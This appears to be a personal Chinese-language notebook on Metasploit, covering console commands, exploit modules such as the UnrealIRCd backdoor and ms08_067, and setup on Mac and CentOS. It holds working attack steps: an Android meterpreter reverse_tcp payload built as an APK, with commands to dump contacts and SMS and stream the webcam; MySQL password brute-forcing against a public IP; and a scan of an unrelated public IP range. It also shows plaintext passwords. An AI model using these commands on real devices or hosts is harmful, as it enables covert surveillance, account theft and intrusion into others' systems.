@@ -1,0 +1,615 @@
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵 MSF 简介 🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+
+🔸 参考
+
+★★★★★ EN https://null-byte.wonderhowto.com/how-to/metasploit-basics/
+★★★★★ CN https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/31.html
+
+
+★★★★ Kali Linux 秘籍 第五章 漏洞评估
+        https://segmentfault.com/a/1190000007067065
+
+
+
+
+
+🔸 Metasploit:
+
+    漏洞检测和利用工具.简称 MSF. 
+    非常容易使用. 最先进的进攻武器.免费.带有大量攻击工具..
+    Kali 自带MSF, 手动安装MSF非常麻烦.虚拟机安装个Kali 是最简单最快的.   
+    Mac/Linux 可以手动安装, 安装好后用msfconsole 命令进入msf交互界面
+
+
+🔸 Armitage:
+
+    是Metasploit框架中一个完全交互式的图形化用户接口，
+    支持Mac 配置麻烦.http://www.fastandeasyhacking.com/download/
+    安装简超级单: brew cask install armitage 
+    armitage 是个 C/S架构. Metasploit is the server and Armitage is the client.
+    armitage 通过界面来控制 Metasploit就这么简单
+
+
+🔸 漏洞扫描器:
+
+        查找应用程序和操作系统中软件的弱点.
+        每个扫描器都有自己的嗅探方法.但是结果都是: 报告所发现的问题.
+
+        扫描分很多步的.
+          首先扫描 某区域内的 活动主机. 和 ip.
+          扫描出开发的端口. 开发的服务.
+          针对某个端口. 和某个服务.
+
+
+🔸 Metasploit 工作流程
+    选择 并配置目标.  
+    验证针对系统的攻击.
+    选择一个要使用的 有效负载.
+    有效负载: 扫描器发现系统入侵点后 将在系统上运行的代码.
+    执行攻击..
+
+
+
+
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵    使用  🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+
+🔸 简介
+    MSFCONSOLE用于管理用户的会话，而Meterpreter则是攻击载荷和渗透攻击交互
+
+    🔅 msfconsole
+    🔅 search linux
+    🔅 use auxiliary/analyze/jtr_linux
+    🔅 show options
+    从输出结果中可以看到jtr_linux模块有5个有效的选项，
+    如Crypt、JOHN_BASE、JOHE_PATH、Munge和Wordlist。在输出的信息中，对这5个选项分别有详细的描述。
+
+
+    🔅 set JOHN_PATH /usr/share/metasploit-framework/data/wordlists/password.lst
+    🔅 exploit
+
+
+    Mac php7 漏洞 最新版本是 php7.0.16 .
+
+
+🔵 msf 入门
+
+    🔅 use exploit/unix/irc/unreal_ircd_3281_backdoor
+    🔅 set rhost 192.168.169.139
+    🔅 exploit
+
+    这里就拿到了对方的shell. 而且是root权限的!!  输入 whoami 可以看到是 root 权限的
+
+    Metasploit 拥有msfpayload 和msfencode 这两个工具，这两个工具不但可以生成exe 型后门，一可以生成网页脚本类型的webshell ，通过生成webshell 然后设置监听器，访问webshell的url，幸运的话可以产生一个session，以便进一步利用
+
+
+    http://23.105.192.96/phpinfo.php
+
+    操作系统渗透.
+
+
+
+
+
+登录信息:
++ -- --=[ 1639 exploits - 943 auxiliary - 288 post        ]
++ -- --=[ 472 payloads - 40 encoders - 9 nops             ]
+    exploits  攻击..
+    payload  模块
+
+    先选择一个模块. 然后配置这个模块. 攻击.
+
+    查找模块: search 
+    使用模块: use
+    模块用法: show options
+    配置模块: set
+    exploit
+
+
+🔸 查看帮助  help  
+🔸 数据库连接情况:  db_status
+🔸 运行nmap扫描:   db_nmap 23.105.192.96
+
+🔸 搜索模块: search          search ms12_020
+🔸 使用模块:  use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+    🔸 模块信息: info
+    🔸 查看可用 payload:   show payloads
+ 
+    🔸 当前exploit可选设置: show options
+        rhost == remote host ==远程主机   
+        rport==remote port ==远程端口 
+        🔸 set RHOST 192.168.181.147    设置要攻击的ip为192.168.181.147
+        🔸 exploit                      开机攻击
+
+
+
+jobs  
+    jbos可以查看msfconsole上存在哪些任务，jbos -k id号码  可以终止某一个任务
+
+connect 
+    测试: 如 connect 23.105.192.96 3306
+
+search platform
+    有时候我们会搜索到大量的模块，那么可以用platform：命令来缩小查询范围。
+    使用platform命令后，所查询的结果会列出rank比较高的模块。
+    如果我要查找mysql的漏洞，那么输入 “search platform：mysql”。所有rank为normal的模块全部都屏蔽了，
+    只剩下几个比较高级的利用模块
+
+
+
+
+
+  输入show 就可以查看 所有的 模块..
+
+  payload 可以分成8大类.
+    inline  
+    staged 
+    Meterpreter
+    PassiveX
+    NoNX
+    Ord
+    IPv6
+    Reflective DLL Injection
+
+
+
+
+🔸 攻击流程
+    use 使用一个攻击.
+    show 显示上下文
+    info 查看某模块的细节.
+    配置这个攻击
+
+Meterpreter
+
+MSFCONSOLE用于管理用户的会话，而Meterpreter则是攻击载荷和渗透攻击交互。
+
+
+
+
+
+
+🔸 msf > show encoders                          显示编码器
+🔸 msf > search type:exploit                    搜索.  种类:探索
+🔸 msf > search type:exploit platform:solaris   搜索 solaris 平台下的 探索工具..
+
+Metasploit Keywords
+关键词.
+
+
+
+🔵 show
+help
+info
+set
+back
+use
+exploit
+session
+exit
+
+
+
+
+msf > nmap -v -sV some_host
+
+msf > db_nmap -v -sV some_host    ➜  这个结果会输出到 数据库!!!!
+msf > hosts                       ➜  列出db_nmap 找到的主机
+msf > hosts -R                    ➜  把找到的主机 加入到目标主机.
+
+
+更多工具:
+search portscan
+
+
+
+🔵 搜索漏洞
+    msf > search CVE-xxxx-xxx
+    msf > search name:mysql
+    msf > search windows type:exploit
+
+
+🔵 使用漏洞
+    msf > use exploit/path/to/exploit_name
+
+
+🔵 设置payload：
+    msf > show payloads
+    msf > set payload path/to/payload
+
+
+🔵 入侵：
+    msf > exploit
+
+
+
+
+🔵 ssh
+use auxiliary/scanner/ssh/ssh_version
+
+ssh服务口令猜测
+use auxiliary/scanner/ssh/ssh_login
+
+
+
+
+
+
+🔵 oracle数据库服务扫描
+use auxiliary/scanner/oracle/tnslsnr_version
+
+
+
+
+
+🔵 mysql攻击
+use auxiliary/scanner/mysql/mysql_login
+
+
+
+🔵 postgresql攻击
+use auxiliary/scanner/postgres/postgres_login
+
+
+🔵 tomcat 攻击
+use auxiliary/scanner/http/tomcat_mgr_login
+
+
+
+
+🔵 telnet 攻击
+use auxiliary/scanner/telnet/telnet_version
+
+
+
+🔵 samba攻击
+use auxiliary/scanner/smb/smb_version
+
+search ms08_067
+use exploit/windows/smb/ms08_067_netapi
+
+SAMBA渗透攻击
+
+search chain_reply
+use exploit/linux/samba/chain_reply
+
+
+
+🔵 浏览器渗透攻击实例
+ms11-050
+use windows/browser/ms11_050_mshtml_cobjectelemnt
+
+
+
+
+
+🔵 入侵安卓手机
+
+msfpayload android/meterpreter/reverse_tcp LHOST=172.16.1.109 LPORT=4444 R > /root/Desktop/apk.apk
+use exploit/mutli/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 172.16.1.109
+exploit
+dump_contacts –这个是导出电话dump_sms –这个是导出信息
+Webcam_list可以看到有几个摄像头
+-i 1 是选择后摄像头
+webcam_snap 是拍照 ，看到我电脑了
+webcam_stream 开启摄像头
+
+
+
+
+
+
+
+
+
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵  实战        🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+
+Mac 本机用 nessus 扫描出两个致命漏洞. 一个是 xcode 版本过低.
+
+官方漏洞信息..
+https://lists.apple.com/archives/security-announce/2016/Oct/msg00005.html
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵  MSF Mac 安装  🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+
+🔸依赖环境: homebrew、ruby、rbenv 、postgresql
+
+    bomebrew 安装软件的.
+    rbenv  管理ruby版本的.
+    🔅 brew install rbenv ruby-build rbenv-default-gems rbenv-gem-rehash rbenv-vars
+
+    安装 Postgresql https://www.enterprisedb.com/downloads/postgres-postgresql-downloads#macosx
+    默认帐号:  postgres  密码 root
+    端口: 5432
+
+🔸 metasploit 主程序安装
+
+    安装教程 https://null-byte.wonderhowto.com/how-to/mac-for-hackers-install-metasploit-framework-0174517/
+
+    🔸 下载 pkg 安装包.
+    安装好pkg没有结束.!!!
+
+    🔅 cd /opt/metasploit-framework/bin/
+    🔅 ./msfconsole
+    第一个问题是 把... 加入环境路径. 选择yes. 之后在任意目录都可以支持 msf 命令了.
+    输入 yes .
+
+    第二个问题: 新建一个数据库..
+    数据库 可以 列出主机. 等等一系列信息. yes 
+    Installing the database will allow us to list credentials, list hosts, and more—which is what we want.
+
+    安装好就 自动 进入 msf 命令界面了.
+    安装就算完成了.
+
+    现在检查下 数据库是否正常:
+    msf > db_status
+    [*] postgresql connected to msf
+
+
+🔸 更新 Metasploit
+    msf 界面里面 输入 msfupdate 就可以更新了. 更新漏洞很重要啊...
+    
+
+🔸 运行:msfconsole
+        环境变量不够用 那就自己加...之后任意目录 输入 msfconsole 都可以进入了.
+
+
+🔸 配置 postsql数据库.
+    这里用 navicat 新建一个query 然后粘下面的就好了...
+    CREATE USER msf WITH PASSWORD 'msf';
+    CREATE DATABASE msf OWNER msf;
+    GRANT ALL PRIVILEGES ON DATABASE msf to msf;
+
+
+
+
+
+
+
+
+
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵 Centos6 安装 🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵🔵
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+
+🔸 MSF 依赖:
+    yum groupinstall 'Development Tools'
+    yum install sqlite-devel libxslt-devel libxml2-devel java-1.7.0-openjdk libpcap-devel nano openssl-devel zlib-devel libffi-devel gdbm-devel readline-devel nano wget
+
+
+🔸 ruby 安装
+
+    ⦿ 安装yaml:(ruby依赖)
+        cd /usr/src && wget http://pyyaml.org/download/libyaml/yaml-0.1.6.tar.gz
+        tar zxvf yaml-0.1.6.tar.gz && cd yaml-0.1.6
+        ./configure --prefix=/usr/local && make && make install
+
+
+    ⦿ 安装ruby
+        cd /usr/src && wget http://ftp.ruby-lang.org/pub/ruby/2.2/ruby-2.2.1.tar.gz
+        tar zxvf ruby-2.2.1.tar.gz && cd ruby-2.2.1
+        ./configure --prefix=/usr/local --with-opt-dir=/usr/local/lib
+        make && make install
+
+
+🔸 安装 Nmap
+    cd /usr/src  svn co https://svn.nmap.org/nmap
+    cd nmap && ./configure && make && make install && make clean
+
+
+
+🔸 安装 Postgresql
+
+    exclude=postgresql*
+    wget https://download.postgresql.org/pub/repos/yum/9.4/redhat/rhel-6-i386/pgdg-centos94-9.4-3.noarch.rpm
+
+    rpm -ivh pgdg-centos94-9.4-3.noarch.rpm
+
+    yum update -y && yum install postgresql94-server postgresql94-devel postgresql94 -y
+
+
+        现在开始初始化服务器并将其配置为自动启动，命令如下
+        service postgresql-9.4 initdb
+        service postgresql-9.4 start
+        chkconfig postgresql-9.4 on
+
+    ⦿ 配置环境路径
+
+        因为编译ruby所必须的gem时，需要把新安装的加入路径，这样编译器就能找到库和二进制文件，接下来需要执行几个命令：
+
+        echo export PATH=/usr/pgsql-9.4/bin:\$PATH >> /etc/bashrc
+            // 如果你用的是zsh 就修改 .zhsrc
+            // 添加这行内容进去就可以  export PATH=/usr/pgsql-9.4/bin:$PATH
+        source ~/.bashrc
+            // 这个是重新加载 bash的意思. 
+            // source ~/.zshrc
+
+
+    ⦿ 切换到Postgresql用户，
+        这样就可以创建我们将要用于Metasploit的用户名和数据库了，命令如下：
+
+        su - postgres
+
+
+        现在开始创建用户和数据库,这些都将在database.yml中使用到。命令如下：
+        createuser msf -P -S -R -D     // 记住自己的的密码. 我是 xujian
+        createdb -O msf msf
+        exit
+
+
+        为了允许我们创建的用户能够连接Postgresql，我们需要设置一下pg_hba.conf文件，命令如下：
+            vi /var/lib/pgsql/9.4/data/pg_hba.conf
+
+            local msf msf md5
+            hostmsf msf 127.0.0.1/8 md5
+            hostmsf msf ::1/128 md5
+
+
+            设置好了之后，重启服务：
+            service postgresql-9.4 restart
+            这里你设置不对 就会启动不了!!!
+            我我们就不该.
+            不就是连接服务器上的数据库么.
+            navicast 可以通过ssh 先登录到服务器. 再连接到数据库.
+            这样就不用该这个设置了..
+
+
+
+
+
+🔸 安装Metasploit框架.
+    我们需要再安装一些Metasploit依赖的Ruby库，命令如下：
+    gem install wirble pg sqlite3 msgpack activerecord redcarpet rspec simplecov yard bundler
+
+
+🔸 使用Git下载最新的Metasploit，命令如下：
+    cd /opt
+    git clone https://github.com/rapid7/metasploit-framework.git
+    cd metasploit-framework
+
+
+
+🔸 为了在终端下也能运行，这样就不仅仅只在Metasploit的文件中运行。我们需要创建软链接。
+
+    bash -c 'for MSF in $(ls msf*); do ln -s /opt/metasploit-framework/$MSF /usr/local/bin/$MSF;done'
+    ln -s /opt/metasploit-framework/armitage /usr/local/bin/armitage
+
+
+🔸 在终端下，进入Metasploit的文件中，使用Bundler Gem来安装合适的Gem版本：
+    bundle install
+
+
+🔸 创建Metasploit框架将要使用的database.yml，命令如下：
+
+    vi /opt/metasploit-framework/database.yml
+        database.yml中的具体内容如下：
+            production:
+            adapter: postgresql
+            database: msf
+            username: msf
+            password: 
+            host: 127.0.0.1
+            port: 5432
+            pool: 75
+            timeout: 5
+
+
+
+        再次执行以下命令，这样就能通过Armitage和msfconsole在当前shell中创建和加载环境变量：
+
+        echo export MSF_DATABASE_CONFIG=/opt/metasploit-framework/database.yml >> /etc/bashrc
+        source ~/.bashrc
+
+
+        msfconsole  运行msf
+        然后服务器重启 输入 msfconsole 看看能不能进去..
+
+
+
+
+
+
+
+
+
+
+弱口令攻击是最基本的攻击方式，metasploit当然也有弱口令攻击的模块 
+下面利用metasploit来爆破一下本地的3306，也就是mysql密码
+
+
+
+❤️ MySQL 登录
+
+    启动MSFCONSOLE:      🔅 msfconsole
+    扫描所有mysql模块    🔅 search mysql
+    选择一个模块:        🔅 use auxiliary/scanner/mysql/mysql_login
+    
+    ⦿ 显示该模块有效选项:  🔅 show options
+        选项名、当前设置、需求、描述
+        其中Required为yes的选项是必须配置的，反之可以不用配置。
+        当然 Required为yes 前面有默认值的可以不配置. 没有默认值的必须配置.
+        如:RHOSTS 就是目标IP. 这个必须配置的...
+
+
+    ⦿ 指定目标、指定用户文件、指定密码文件.
+        📌 set RHOSTS 23.105.192.96
+        📌 set PASSWORD xujian0219
+        📌 set USERNAME root
+        
+        set user_file /Users/v/Desktop/usernames.txt
+        set pass_file /Users/v/Desktop/passwords.txt
+
+        set USERNAME root                           设置账户也，可以指定一个文件 
+        set USER_FILE 文件名
+        set PASS_FILE lee/mima.txt                  设置用于爆破的密码字典
+        set THREADS 1                               设置线程，越大越快，我的密码本不大，1就够了
+
+
+    🔅 exploit  扫描的意思... run 也可以.
+
+
+
+
+
+
+❤️ 查 某段IP内的 活动mysql.
+    use auxiliary/scanner/mysql/mysql_version
+
+    set RHOSTS 101.92.194.1-254
+
+    run
+        101.92.194.204
+        101.92.192.0 - 101.92.207.255
+        101.92.192.0/20
+
+    本机iP: 101.225.78.86
+
+    netstat -nr 
+    查看本机网段.
+
+    nmap 网段内活动主机
+        nmap -sP 101.225.72/21
+
+        怎么找出 活动主机中的... 服务器.
+
+        Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-04-10 11:17 CST
+        Nmap scan report for 101.225.72.3
+        Host is up (0.089s latency).
+        Nmap scan report for 101.225.72.6
+        Host is up (0.12s latency).
+        Nmap scan report for 101.225.72.11
+        Host is up (0.11s latency).
+        Nmap done: 24 IP addresses (3 hosts up) scanned in 17.88 seconds
+
+
+    也可以直接用 nessus 来扫描网段...
+
+
+    然后呢...
+    针对某电脑 进行....xxoo
+
+
+
+
